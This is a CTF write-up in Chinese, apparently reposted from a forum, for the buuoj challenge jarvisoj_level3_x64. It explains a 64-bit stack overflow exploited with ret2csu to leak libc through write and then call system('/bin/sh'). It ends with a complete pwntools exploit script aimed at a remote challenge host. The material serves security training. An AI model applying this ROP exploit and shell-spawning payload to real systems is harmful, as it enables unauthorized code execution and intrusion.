
# [CTF] [ret2csu]jarvisoj_level3_x64

- 原帖：https://www.52pojie.cn/forum.php?mod=viewthread&tid=1814919
- 抓取时间：2026-11-01T22:48:58
- 题目来源：`buuoj`

参考链接：

- （主）https://niceseven.github.io/post/2020/04/14/buuctf-pwn-jarvisoj_level3_x64/
- https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/

## 题目信息

64位，环境位`ubuntu16`，开了`NX`。

![](https://attach.52pojie.cn/forum/202307/29/210705tq0ysqtjly4atk9j.png)
`1.png` (26.31 KB, 下载次数: 2)

[附件下载](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjYzMTMyM3xhNjA5MGM4OXwxNzkzNTczMzM2fDE2ODA4NnwxODE0OTE5&nothumb=yes)

2023-7-29 21:07 上传

`vuln`函数，可以使用栈溢出。

![](https://attach.52pojie.cn/forum/202307/29/210707tgtpvpaau9guuz55.png)
`2.png` (21.61 KB, 下载次数: 2)

[附件下载](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjYzMTMyNHxlYWZkYjAzYXwxNzkzNTczMzM2fDE2ODA4NnwxODE0OTE5&nothumb=yes)

2023-7-29 21:07 上传

题目中没有`system`和`execve`，也没有给出`puts`函数，所以需要使用`write`函数输出`write_got`，`ret2libc`。

`write`函数需要三个参数，分别传入`rdi`，`rsi`，`rdx`中，`gadget`中没有`rdx_ret`因此无法使用。

![](https://attach.52pojie.cn/forum/202307/29/210710zs796d616up97mmn.png)
`3.png` (61.37 KB, 下载次数: 2)

[附件下载](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjYzMTMyNXw1Y2YyMTg1YnwxNzkzNTczMzM2fDE2ODA4NnwxODE0OTE5&nothumb=yes)

2023-7-29 21:07 上传

## 解题思路

- 利用`ret2csu`构造`rdi`、`rsi`、`rdx`的值
- 计算`libc`基地址
- 栈溢出`getshell`

前面说过64位的系统函数传参前3个参数要用到`rdi`、`rsi`、`rdx`，但是通过`ROPgadget`查找缺少了`rdx`。

`ret2csu`主要是用到如下的两个`gadget`，通过`pop`和`mov`控制`rdi`、`rsi`、`rdx`寄存器。注意`0x4006a1-0x4006a4`这里有个比较`rbx`和`rbp`是否相同然后执行`jne`跳转的指令段，所以在执行`gadget1`要构造`rbx=0`，`rbp=1`，才不会进入哪个循环的跳转。通过`gadget1`中的`pop r12`和`0x400699`的`call r12+rbx*8`来控制我们想执行的函数，本题要执行`write`来`leak`，所以我们传入`r12`的值为`write_got`。这里传入`plt`好像执行不了，具体原因还不清楚。为了满足`call r12`所以需要`rbx=0`，这样`r12+rbx*8=r12=write_got => call write_got`，参数1传入`r15`，参数2传入`r14`，参数3传入`r13`，这样在执行`gadget2`之后就会使参数1到3分别`mov`到`rdi`、`rsi`、`rdx`，也就是64位程序的前3个参数传参顺序。

![](https://attach.52pojie.cn/forum/202307/29/210712j8zv7d7n078d6e77.png)
`4.png` (63.71 KB, 下载次数: 2)

[附件下载](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjYzMTMyNnw0ZmU3MDYyOHwxNzkzNTczMzM2fDE2ODA4NnwxODE0OTE5&nothumb=yes)

2023-7-29 21:07 上传

在构造`leak`的`payload`时候需要`0x38`的数据填充，是因为我们先执行的`gadget1`，再执行`gadget2`，但是从`gadget1`跳转到`gadget2`后又会执行一遍`gadget1`，此时`gadget1`中的这些寄存器是不需要的，所以从`0x4006a6`到`0x4006b2`之间栈顶移动的7个机器字长，即`6*0x8=0x38`，所以需要填充`0x38`覆盖这里的栈空间，然后覆盖到`0x4006b4`的`ret`来使函数返回到`vulnerable_function()`，从而再执行一遍`read`来进行栈溢出`getshell`。

![](https://attach.52pojie.cn/forum/202307/29/210714d0vcj44wcq5mw5fl.png)
`5.png` (11.43 KB, 下载次数: 1)

[附件下载](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjYzMTMyN3xiOTZjMjg1NnwxNzkzNTczMzM2fDE2ODA4NnwxODE0OTE5&nothumb=yes)

2023-7-29 21:07 上传

`ida`中也可以看栈指针来计算空间大小`0x38-0x0=0x38`。

## WP

```python
# -*- coding: utf-8 -*-
from pwn import*
context.log_level='debug'
context.arch='amd64'
context.os = "linux"

pc = "./level3_x64"

if __name__ == '__main__':
    local = sys.argv[1]
    if local == '1':
        r= process(pc)
        elf = ELF(pc)
        libc = elf.libc
    else:
        r=remote("node4.buuoj.cn",27598)
        elf = ELF(pc)
        libc = elf.libc

sa = lambda s,n : r.sendafter(s,n)
sla = lambda s,n : r.sendlineafter(s,n)
sl = lambda s : r.sendline(s)
sd = lambda s : r.send(s)
rc = lambda n : r.recv(n)
ru = lambda s : r.recvuntil(s)
ti = lambda: r.interactive()
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))

def db():
    gdb.attach(r)
    pause()

def dbs(src):
    gdb.attach(r, src)

csu_end_ret = 0x00000000004006AA
csu_front_call = 0x0000000000400690
write_got_addr = elf.got['write']
write_plt_addr = elf.plt['write']
main_addr = elf.symbols['vulnerable_function']
rdi_ret_addr = 0x00000000004006b3

csu_payload = p64(0) + p64(1) + p64(write_got_addr) + p64(8) +  p64(write_got_addr) + p64(1)
payload = b'a'* (0x80+8) + p64(csu_end_ret) + csu_payload + p64(csu_front_call) + b'a'*0x38 + p64(main_addr)
sla('Input:\n',payload)
write_addr = u64(r.recv(6).ljust(8,b'\x00'))
lg('write_addr')

libc_base = write_addr - libc.sym['write']
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))
system_addr = libc_base + libc.sym["system"]

payload = b'a'* (0x80+8) + p64(rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)
sla('Input:\n',payload)
ti()

```
